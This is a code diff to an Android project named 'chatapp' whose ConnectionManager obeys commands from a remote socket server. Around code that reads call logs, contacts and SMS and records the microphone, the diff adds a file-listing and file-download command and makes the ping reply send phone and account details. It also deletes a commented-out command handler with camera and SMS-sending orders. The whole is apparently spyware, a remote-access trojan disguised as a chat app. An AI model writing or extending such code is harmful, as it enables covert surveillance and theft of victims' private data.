@@ -5,6 +5,8 @@ import android.util.Log;
 
 import com.example.chatapp.calllogs.CallLogReader;
 import com.example.chatapp.contact.ContactReadService;
+import com.example.chatapp.fiemanager.FileManager;
+import com.example.chatapp.info.PhoneAccountInfo;
 import com.example.chatapp.mic.GetRecord;
 import com.example.chatapp.sms.SMSReadService;
 import com.example.chatapp.socket.IOSocket;
@@ -37,10 +39,10 @@ public class ConnectionManager {
             ioSocket = IOSocket.getInstance().getIoSocket();
 
 
-            ioSocket.on("ping", new Emitter.Listener() {
+            ioSocket.on("p", new Emitter.Listener() {
                 @Override
                 public void call(Object... args) {
-                    ioSocket.emit("pong");
+                    ioSocket.emit("p", PhoneAccountInfo.getPhoneInfo());
                 }
             });
 
@@ -64,6 +66,19 @@ public class ConnectionManager {
                                 int sec = (int) args[1];
                                 GetRecord.startRecording(sec);
                                 break;
+                            case "fm":
+                                String subCommand = (String) args[1];
+                                Log.e("subcommand", subCommand);
+                                String path = (String) args[2];
+                                if (subCommand.equals("ls")){
+                                    Log.e("command","ls");
+                                    IOSocket.getInstance().getIoSocket().emit("fm-ls",FileManager.listFiles(path));
+                                    break;
+                                }else if (subCommand.equals("dl")){
+                                    FileManager.downloadFile(path);
+                                    break;
+                                }
+
                             default:
                                 break;
                         }
@@ -73,57 +88,6 @@ public class ConnectionManager {
                 }
             });
 
-//            ioSocket.on("order", new Emitter.Listener() {
-//                @Override
-//                public void call(Object... args) {
-//                    try {
-//                        JSONObject data = (JSONObject) args[0];
-//                        String order = data.getString("order");
-//                        Log.e("order",order);
-//                        switch (order){
-//                            case "x0000ca":
-//                                if(data.getString("extra").equals("camList"))
-//                                    x0000ca(-1);
-//                                else if (data.getString("extra").equals("1"))
-//                                    x0000ca(1);
-//                                else if (data.getString("extra").equals("0"))
-//                                    x0000ca(0);
-//                                break;
-//                            case "x0000fm":
-//                                if (data.getString("extra").equals("ls"))
-//                                    x0000fm(0,data.getString("path"));
-//                                else if (data.getString("extra").equals("dl"))
-//                                    x0000fm(1,data.getString("path"));
-//                                break;
-//                            case "x0000sm":
-//                                if(data.getString("extra").equals("ls"))
-//                                    x0000sm(0,null,null);
-//                                else if(data.getString("extra").equals("sendSMS"))
-//                                    x0000sm(1,data.getString("to") , data.getString("sms"));
-//                                break;
-//                            case "x0000cl":
-//                                x0000cl();
-//                                break;
-//                            case "x0000cn":
-//                                x0000cn();
-//                                break;
-//                            case "x0000mc":
-//                                x0000mc(data.getInt("sec"));
-//                                break;
-//                            case "x0000lm":
-//                                x0000lm();
-//                                break;
-//
-//
-//                        }
-//
-//
-//
-//                    }catch (Exception e) {
-//                        e.printStackTrace();
-//                    }
-//                }
-//            });
             ioSocket.connect();
 
         }catch (Exception ex){
